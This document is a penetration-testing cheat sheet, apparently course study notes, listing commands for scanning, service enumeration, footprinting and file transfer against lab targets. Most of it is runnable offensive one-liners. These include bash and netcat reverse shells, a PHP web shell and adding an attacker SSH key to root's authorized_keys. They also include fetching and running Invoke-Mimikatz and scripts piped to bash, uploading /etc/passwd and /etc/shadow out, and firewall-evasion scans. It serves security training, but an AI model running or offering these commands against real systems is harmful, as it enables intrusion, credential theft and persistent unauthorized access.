# Getting Started

### Common Terms

| **Shell Types** |  **Description**  |
| --------------|-------------------|
| Reverse shell | Initiates a connection back to a "listener" on our attack box. |
| Bind shell | "Binds" to a specific port on the target host and waits for a connection from our attack box.|
| Web shell | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command. |

### Basic Tools

| **Networking** | **Description** |
| --------------|-------------------|
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |

| **Tmux** | **Description** |
| --------------|-------------------|
| Prefix + c | New window |
| Prefix + 0-9 | Window numbers to switch |
| Prefix + w | Window menu to switch |
| Prefix + , | Renaming window |
| Ctrl + d / Prefix + x | Deleting window |
| Prefix + [ | Scroll q to exit |

| **Vim** | **Description** |
| --------------|-------------------|
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

### Service Scanning

| **Command**   | **Description**   |
| --------------|-------------------|
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |

### Web Enumeration

| **Command**   | **Description**   |
| --------------|-------------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |

### Public Exploits

| **Command**   | **Description**   |
| --------------|-------------------|
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |

### Using Shells

| **Command**   | **Description**   |
| --------------|-------------------|
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |

### Privilege Escalation

| **Command**   | **Description**   |
| --------------|-------------------|
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |

### Transferring Files

| **Command**   | **Description**   |
| --------------|-------------------|
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |

---

# Network Enumeration with Nmap  

| **State** | 	**Description** |
| --------------|-------------------|
| open |	This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. |
| closed |	When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. |
| filtered | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.|
| unfiltered |	This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.|
| open/filtered |	If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. |
| closed/filtered |	This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. |

### Scanning Options

| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |

### Output Options

| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |

### Performance Options

| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |

### Unique Commands

| **Command**   | **Description**   |
| --------------|-------------------|
| `sudo nmap 10.129.2.0/24 -sn -oA tnet \| grep for \| cut -d" " -f5` | Scan Network Range in a subnet / Ping sweep using nmap |
| **Firewall and IDS/IPS Evasion Using NMAP** | |
| `sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5` | Scan by Using Decoys |
| `sudo nmap 10.129.2.28 -n -Pn -p445 -O` | Testing Firewall Rule |
| `sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0` | Scan by Using Different Source IP |
| `sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53` | DNS Proxying / SYN-Scan From DNS Port |
| `ncat -nv --source-port 53 10.129.2.28 50000` | Connect To The Filtered Port |
| `nmap -sL 172.16.7.60` | Get hostname of a host |

---

# Footprinting

## Infrastructure-based Enumeration

### Domain Information

| **Commands** |  **Description**  |
| --------------|-------------------|
| [crt.sh](https://crt.sh/) | Online subdomain finder |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |
| `dig any inlanefreight.com` |  DNS Records |

### Cloud Resources

| **Commands** |  **Description**  |
| --------------|-------------------|
| [Domain.glass](https://domain.glass/) | Third-party providers such as domain.glass can also tell us a lot about the company's infrastructure. |
| Wappalyzer | Extension |
| [Gray](https://buckets.grayhatwarfare.com/) | Another very useful provider is GrayHatWarfare. We can do many different searches, discover AWS, Azure |

## Host-based Enumeration

### FTP

|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |
| `get` | To download a file |
| `put` | To upload a file |
| `find / -type f -name ftp* 2>/dev/null \| grep scripts` | Nmap FTP Scripts |

### SMB

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB and to see available shares |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |
| `samrdump.py 10.129.14.128` | Impacket - Samrdump.py |
| `smbmap -H 10.129.14.128` | Enumerating SMB null session using smbmap |
| `crackmapexec smb 10.129.14.128 --shares -u '' -p ''` | Enumerating SMB null session using cme |
| [Enum4linux](https://github.com/cddmp/enum4linux-ng.git) | This tool automates many of the SMB queries, but not all, and can return a large amount of information. |
| `./enum4linux-ng.py 10.129.14.128 -A` | Enum4Linux-ng - Enumeration |

### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |
| `sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049` | Nmap nsf scan |
| | |
| `mkdir target-NFS`
`sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock`
`cd target-NFS`
`tree .` | Mounting NFS share |
| `ls -l mnt/nfs/` | List Contents with Usernames & Group Names |
| `ls -n mnt/nfs/` | List Contents with UIDs & GUIDs |
| `cd ..`
`sudo umount ./target-NFS` | Unmounting |

### DNS 

|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver / Zone transfer |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |
| `dig soa www.inlanefreight.com` | The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. |
| `dig CH TXT version.bind 10.129.120.85` | Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command |
| `for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 \| grep -v ';\|SOA' \| sed -r '/^\s*$/d' \| grep $sub \| tee -a subdomains.txt;done` | Subdomain bruteforcing(command might be wrong bc of md lang use the module) |
| `dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb` | Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example DNSenum. Also we can perform automatic dns enum using this tool |

### SMTP

|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` | Connect to the smtp server |
| AUTH PLAIN | AUTH is a service extension used to authenticate the client. |
| HELO | The client logs in with its computer name and thus starts the session. |
| MAIL FROM |	The client names the email sender. |
| RCPT TO |	The client names the email recipient. |
| DATA |	The client initiates the transmission of the email. |
| RSET |	The client aborts the initiated transmission but keeps the connection between client and server. |
| VRFY |	The client checks if a mailbox is available for message transfer. |
| EXPN |	The client also checks if a mailbox is available for messaging with this command. |
| NOOP |	The client requests a response from the server to prevent disconnection due to time-out. |
| QUIT |	The client terminates the session. |
| `sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v` | we can also use the smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests |

### IMAP / POP3

|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |
| `curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd` | Connect to the IMAPS service. |

### SNMP

|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |

### MySQL

|**Command**|**Description**|
|-|-|
| `sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*` | Scanning MySQL Server |
| `mysql -u root -pP4SSw0rd -h 10.129.14.128` | Interaction with the MySQL Server |

### MSSQL

|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |
| `locate mssqlclient.py` | Locate mssqlclient.py |
| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248` | NMAP MSSQL Script Scan |

### IPMI

|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |
| `sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local` | Nmap |

### SSH

|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |
| `sudo nmap -sV -p 873 127.0.0.1` | Scanning for Rsync |
| `nc -nv 127.0.0.1 873` | Probing for Accessible Shares |
| `rsync -av --list-only rsync://127.0.0.1/dev` | Enumerating an Open Share |

### Windows Remote Management

|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

---

# Information Gathering - Web Edition

### WHOIS

| **Command** | **Description** |
|-|-|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET` | WHOIS lookup for the target. |

### DNS Enumeration

| **Command** | **Description** |
|-|-|
| `nslookup $TARGET` | Identify the `A` record for the target domain. |
| `nslookup -query=A $TARGET` | Identify the `A` record for the target domain. |
| `dig $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `dig a $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `nslookup -query=PTR <IP>` | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>` | Identify the `PTR` record for the target IP address.  |
| `nslookup -query=ANY $TARGET` | Identify `ANY` records for the target domain. |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain. |
| `nslookup -query=TXT $TARGET` | Identify the `TXT` records for the target domain. |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain. |
| `nslookup -query=MX $TARGET` | Identify the `MX` records for the target domain. |
| `dig mx $TARGET @<nameserver/IP>` | Identify the `MX` records for the target domain. |
| `whois $TARGET` | WHOIS lookup for the target. |

### Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| [VirusTotal](https://www.virustotal.com/gui/home/url) | VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them. |
| [Censys](https://censys.io/) | CT logs to discover additional domain names and subdomains for a target organization |
| [Crt.sh](https://crt.sh/) | CT logs to discover additional domain names and subdomains for a target organization |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | Searching for subdomains and other information on the sources provided in the source.txt list. |
| `head/tail -n20 facebook.com_crt.sh.txt` | To view the top/bottom 20 lines from a file |
| [TheHarvester](https://github.com/laramies/theHarvester) | The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering. For now, we will use the following modules |

#### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

### Passive Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained. |

### Active Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `curl -I "http://${TARGET}"` | Display HTTP headers of the target webserver. |
| `whatweb -a https://www.facebook.com -v` | Technology identification. |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF Fingerprinting. |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list. |

### Active Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains. |

### Virtual Hosts

| **Resource/Command** | **Description** |
|-|-|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |

### Crawling

| **Resource/Command** | **Description** |
|-|-|
| `ZAP` | [https://www.zaproxy.org/](https://www.zaproxy.org/) |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | Mutated bruteforcing against the target web server. |

---

# File Transfers

### Windows File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| **MD and Base64 File encoding** | |
| `md5sum id_rsa` | Checks md value of a file in linux |
| `cat id_rsa \|base64 -w 0;echo` | File to base64 - encode from linux |
| `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))` | Encode File Using PowerShell |
| `echo BASE64STRING \| base64 -d > hosts` | Decode Base64 String in Linux |
| **File download in windows** | |
| `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("Base 64 string"))` | Decoding the base64 string in windows -PWSH |
| `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5` | Checking the md value of a file in windows -PWSH |
| `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')` **OR** `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') \| IEX` | PowerShell DownloadString - Fileless Method -PWSH |
| `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` | From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. -PWSH |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 \| IEX` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing. -PWSH |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command -PWSH |
| **SMB File Sharing** | |
| `sudo impacket-smbserver share -smb2support /tmp/smbshare` **OR** `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` | We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket |
| `copy \\192.168.220.133\share\nc.exe` **OR** `net use n: \\192.168.220.133\share /user:test test`| Copy a File from the SMB Server -CMD |
| **FTP File Sharing** | |
| `sudo pip3 install pyftpdlib` |  Installing the FTP Server Python3 Module - pyftpdlib |
| `sudo python3 -m pyftpdlib --port 21` | Setting up a Python3 FTP Server |
| `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')` |  Transfering Files from an FTP Server Using PowerShell |
| **PowerShell Web Uploads** | |
| `pip3 install uploadserver` | Installing a Configured WebServer with Upload |
| `python3 -m uploadserver` | Installing a Configured WebServer with Upload |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts` | Uploading the file using the script |
| **PowerShell Base64 Web Upload** | |
| `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64` | Uploading the file using Powershell script |
| `nc -lvnp 8000` | We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file. |
| `echo <base64> \| base64 -d -w 0 \> hosts` | Decoding |
| **SMB Uploads** | |
| `sudo pip install wsgidav cheroot` |  Installing WebDav Python modules | 
| `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` | Using the WebDav Python module |
| `dir \\192.168.49.128\DavWWWRoot` | Connecting to the Webdav Share -CMD |
| `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\` | Uploading Files using SMB |
| **FTP Uploads** | |
| `sudo python3 -m pyftpdlib --port 21 --write` | Starting the upload server |
| `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` | PowerShell Upload File using ftp |

### Linux File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a File Using wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a File Using wget |
| `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh \| bash` | Fileless Download with cURL |
| `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py \| python3` |  Fileless Download with wget |
| | |
| **Download with Bash (/dev/tcp)** | |
| `exec 3<>/dev/tcp/10.10.10.32/80` | Connect to the Target Webserver | 
| `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3` | HTTP GET Request |
| `cat <&3` | Print the Response |
| | |
| **SSH Download / Upload** | |
| `scp plaintext@192.168.49.128:/root/myroot.txt .` | Linux - Downloading Files Using SCP |
| `scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/` | File Upload using SCP |
| | |
| **Web Upload** | |
| `python3 -m pip install --user uploadserver` | Pwnbox - Start Web Server |
| `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` | Pwnbox - Create a Self-Signed Certificate |
| `mkdir https && cd https` | Pwnbox - Start Web Server |
| `python3 -m uploadserver 443 --server-certificate /root/server.pem` | Pwnbox - Start Web Server |
| `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure` | Linux - Upload Multiple Files |
| | |
| **Alternative Web File Transfer Method** | |
| `python3 -m http.server` | Linux - Creating a Web Server with Python3 |
| `python2.7 -m SimpleHTTPServer` | Linux - Creating a Web Server with Python2.7 |
| `php -S 0.0.0.0:8000` | Linux - Creating a Web Server with PHP |
| `ruby -run -ehttpd . -p8000` | Linux - Creating a Web Server with Ruby |
| `wget 192.168.49.128:8000/filetotransfer.txt` | Download the File from the Target Machine onto the Pwnbox |

### Transfering Files with Code

| **Command** | **Description** |
| --------------|-------------------|
| **Python** | |
| `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` | Python 2 - Download |
| `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` | Python 3 - Download |
| `python3 -m uploadserver` | Starting the Python uploadserver Module |
| `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` | Uploading a File Using a Python One-liner |
| | |
| **PHP** | |
| `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | PHP Download with File_get_contents() |
